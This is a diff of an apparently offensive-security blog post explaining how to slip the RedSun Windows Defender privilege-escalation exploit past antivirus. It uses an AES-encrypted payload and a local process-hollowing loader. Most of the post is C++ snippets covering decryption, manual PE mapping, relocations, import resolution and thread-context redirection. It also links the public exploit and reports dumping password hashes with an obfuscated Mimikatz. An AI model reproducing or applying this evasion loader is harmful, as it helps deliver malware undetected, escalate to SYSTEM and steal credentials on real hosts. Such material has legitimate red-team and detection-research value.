@@ -25,7 +25,7 @@ The vulnerability allows a low-privileged user to escalate to **SYSTEM** by:
 - Crafting a scenario involving **opportunistic locks** and **NTFS junction abuse** to coerce Defender into writing attacker-controlled content to a privileged path.
 - Hijacking the **Storage Tiers Management Engine COM object** (`TieringEngineService.exe`) to redirect the write into `C:\Windows\System32`.
 
-Because Defender runs as SYSTEM, the overwritten binary is later executed in a fully elevated context - granting SYSTEM shell access from a standard user account.
+Because Defender runs as SYSTEM, the overwritten binary is later executed in a fully elevated context, granting SYSTEM shell access from a standard user account.
 
 The public PoC for RedSun is available at: [https://github.com/Nightmare-Eclipse/RedSun](https://github.com/Nightmare-Eclipse/RedSun)
 
@@ -33,7 +33,7 @@ The problem ? **Dropping the raw RedSun.exe on disk is immediately flagged by Wi
 
 ---
 
-## The Problem - Static PE Detection
+## The Problem : The static PE Detection
 
 Most Endpoint Detection & Response (EDR) and Antivirus (AV) solutions maintain a **signature database** that matches byte patterns in PE (Portable Executable) files on disk. When a known-malicious executable like RedSun is written to disk:
 
@@ -41,21 +41,21 @@ Most Endpoint Detection & Response (EDR) and Antivirus (AV) solutions maintain a
 2. It hashes the file or matches byte sequences against known signatures.
 3. The file is quarantined or deleted before execution.
 
-This is **static detection** - the file is flagged purely by its on-disk representation, before it ever runs.
+This is **static detection**, the file is flagged purely by its on-disk representation, before it ever runs.
 
 To successfully deliver the RedSun PoC, we need to ensure **no recognisable byte pattern of the original binary ever touches the disk in cleartext**.
 
 <div class="diagram-custom">
-    <div class="diagram-title">Diagram 1 - Full Attack Overview: From Disk to SYSTEM Shell </div>
+    <div class="diagram-title">Diagram 1 : Full Attack Overview: From Disk to SYSTEM Shell </div>
     <img width="1189" height="846" alt="image" src="https://github.com/user-attachments/assets/d9185e02-ccba-4e82-b33a-5684915c1cac" />
 </div>
 
 
 ---
 
-## The Solution - Local Hollowing with AES Encryption
+## Local Hollowing with AES Encryption
 
-**Local Process Hollowing** (also referred to as *self-injection* hollowing) is a technique where a process loads a secondary PE image into its own memory space - hollowing itself out and replacing its execution context with the injected payload - without ever writing the decrypted payload to disk.
+**Local Process Hollowing** (also referred to as *self-injection* hollowing) is a technique where a process loads a secondary PE image into its own memory space, hollowing itself out and replacing its execution context with the injected payload and without ever writing the decrypted payload to disk.
 
 The approach used here:
 
@@ -68,9 +68,9 @@ The approach used here:
     - Apply base relocations (fixups)
     - Resolve and load imports
 5. **Redirect the main thread's instruction pointer** to the entry point of the mapped payload.
-6. **Resume the main thread**, which now executes the decrypted RedSun entry point - never written to disk.
+6. **Resume the main thread**, which now executes the decrypted RedSun entry point and NEVER written to disk.
 
-The resulting loader binary (`HarryPotter.exe`) contains only AES ciphertext - no identifiable RedSun signatures - and decrypts and executes entirely in memory.
+The resulting loader binary (`HarryPotter.exe`) contains only AES ciphertex, no identifiable RedSun signatures and decrypts and executes entirely in memory.
 
 ---
 
@@ -94,8 +94,7 @@ The loader's `main` function is deliberately minimal. Its only job is to:
  */
 
 int main() {
-
-    // Get a pseudo-handle to the current thread, the main thread.
+    // Get a pseudo-handle to the current thread, which is the main thread.
     HANDLE pseudoHandle = GetCurrentThread();
     HANDLE realHandle;
 
@@ -111,7 +110,7 @@ int main() {
     // Wait for the "Doit" function to finish execution
     WaitForSingleObject(thread, INFINITE);
 
-    // Cleanup: Close thread and handle
+    // Cleanup
     CloseHandle(thread);
     CloseHandle(realHandle);
 
@@ -121,7 +120,7 @@ int main() {
 ```
 
 > **Why duplicate the pseudo-handle?**  
-> `GetCurrentThread()` returns a pseudo-handle - a constant value that is only meaningful within the calling thread itself. To pass the main thread handle to another thread (`Doit`) and suspend it from there, we need a **real, transferable handle**. `DuplicateHandle` achieves this.
+> `GetCurrentThread()` returns a pseudo-handle which is a constant value that is only meaningful within the calling thread itself. To pass the main thread handle to another thread (`Doit`) and suspend it from there, we need a **real, transferable handle**. `DuplicateHandle` achieves this.
 
 
 ---
@@ -130,7 +129,7 @@ int main() {
 
 The `Doit` function receives the real main thread handle and carries out the full hollowing sequence.
 
-#### Step 1 - Suspend the Main Thread
+#### Step 1 : Suspend the Main Thread
 
 ```cpp
 SuspendThread(mainThreadHandle);
@@ -138,17 +137,17 @@ SuspendThread(mainThreadHandle);
 
 The main thread is suspended immediately so it cannot execute any further instructions while the payload is being mapped. This ensures the entry point redirect will take effect cleanly.
 
-#### Step 2 - Decrypt the AES Payload
+#### Step 2 : Decrypt the AES Payload
 
-The encrypted RedSun blob is embedded as a byte array in the loader. AES decryption (e.g., AES-256-CBC) is performed in memory:
+The encrypted RedSun blob is embedded as a byte array in the loader. AES decryption is performed in memory:
 
 ```cpp
 AES_decrypt(encryptedPayload, encryptedSize, aesKey, aesIV, &decryptedBuffer, &decryptedSize);
 ```
 
-At this point, `decryptedBuffer` holds a valid PE image - the original RedSun.exe - purely in memory.
+At this point, `decryptedBuffer` holds a valid PE image which is the original RedSun.exe (purely in memory).
 
-#### Step 3 - Allocate Memory for the Mapped Image
+#### Step 3 : Allocate Memory for the Mapped Image
 
 Read the PE headers to determine the required virtual size and preferred base address:
 
@@ -169,7 +168,7 @@ If the preferred base is unavailable, `VirtualAlloc` returns a different address
 
 #### Step 4 - Map Headers and Sections
 
-Copy the PE headers:
+Copy the PE headers :
 
 ```cpp
 memcpy(imageBase, decryptedBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
@@ -178,6 +177,7 @@ memcpy(imageBase, decryptedBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
 Then iterate over each section and copy it to its correct virtual address:
 
 ```cpp
+// On va itérer sur chaque section
 PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
 for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
     LPVOID dest = (LPVOID)((ULONG_PTR)imageBase + section->VirtualAddress);
@@ -186,9 +186,9 @@ for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
 }
 ```
 
-#### Step 5 - Apply Base Relocations
+#### Step 5 : Apply Base Relocations
 
-If the image was not loaded at its preferred base, each relocation entry must be patched. The delta between the actual base and the preferred base is computed and applied:
+If the image was not loaded at its preferred base, each relocation entry must be patched. The delta between the actual base and the preferred base is computed and applied :
 
 ```cpp
 ULONG_PTR delta = (ULONG_PTR)imageBase - ntHeaders->OptionalHeader.ImageBase;
@@ -198,27 +198,26 @@ PIMAGE_BASE_RELOCATION reloc = /* pointer to .reloc section */;
 while (reloc->VirtualAddress) {
     ULONG_PTR *patch = (ULONG_PTR *)((ULONG_PTR)imageBase + reloc->VirtualAddress + offset);
     *patch += delta;
-    // advance...
+    // ...
 }
 ```
 
 
+#### Step 6 : Resolve Imports
 
-#### Step 6 - Resolve Imports
-
-Walk the Import Directory Table and resolve each imported function via `LoadLibrary` / `GetProcAddress`:
+Walk the IAT and resolve each imported function via `LoadLibrary` / `GetProcAddress`:
 
 ```cpp
 PIMAGE_IMPORT_DESCRIPTOR importDesc = /* pointer to import directory */;
 while (importDesc->Name) {
     HMODULE lib = LoadLibraryA((LPCSTR)((ULONG_PTR)imageBase + importDesc->Name));
-    // Walk thunk and patch each IAT entry with the resolved address
+    // Patch each IAT entry with the resolved address
     ...
     importDesc++;
 }
 ```
 
-#### Step 7 - Redirect Main Thread Entry Point and Resume
+#### Step 7 : Redirect Main Thread Entry Point and Resume
 
 With the image fully mapped and imports resolved, set the main thread's instruction pointer to the payload's entry point via `SetThreadContext`:
 
@@ -227,7 +226,7 @@ CONTEXT ctx = { 0 };
 ctx.ContextFlags = CONTEXT_FULL;
 GetThreadContext(mainThreadHandle, &ctx);
 
-// On x64, RCX holds the first argument; RIP is the instruction pointer
+// On x64, RCX holds the first argument and RIP is the instruction pointer
 ctx.Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 ctx.Rip = ctx.Rcx;
 
@@ -235,7 +234,7 @@ SetThreadContext(mainThreadHandle, &ctx);
 ResumeThread(mainThreadHandle);
 ```
 
-The main thread resumes execution at the RedSun entry point - fully mapped, fully resolved, entirely in memory.
+The main thread resumes execution at the RedSun entry point (fully mapped, fully resolved, entirely in memory).
 
 
 
@@ -256,7 +255,7 @@ The loader (`HarryPotter.exe`) was delivered to the target host. On execution:
 - From the SYSTEM shell, local password hashes were extracted using an obfuscated Mimikatz build, confirming full host compromise.
 
 <div class="diagram-custom">
-  <div class="diagram-title">Diagram 2 — Result (PoC) </div>
+  <div class="diagram-title">Diagram 2 : Result (PoC) </div>
   <img width="1609" height="803" alt="image" src="https://rfc6592.github.io/assets/img/LocalHollowing-RedSun.png" />
 </div>
 
@@ -265,8 +264,8 @@ The loader (`HarryPotter.exe`) was delivered to the target host. On execution:
 ## Key Takeaways
 
 - **Static detection** operates on the on-disk PE representation. If the bytes on disk are AES ciphertext, there is no signature to match.
-- **Local Hollowing** keeps the decrypted payload entirely in memory - no temp files, no disk writes of the plaintext PE.
-- **Manual PE mapping** is a foundational offensive skill: understanding headers, sections, relocations, and the IAT is essential for any in-memory execution technique.
+- **Local Hollowing** keeps the decrypted payload entirely in memory (no temp files, no disk writes of the plaintext PE).
+- **Manual PE mapping** understanding headers, sections, relocations, and the IAT is essential for any in-memory execution technique.
 - The `DuplicateHandle` + `SuspendThread` + `SetThreadContext` pattern is a clean way to redirect a process's own execution without spawning a new, detectable child process.
 
 ---
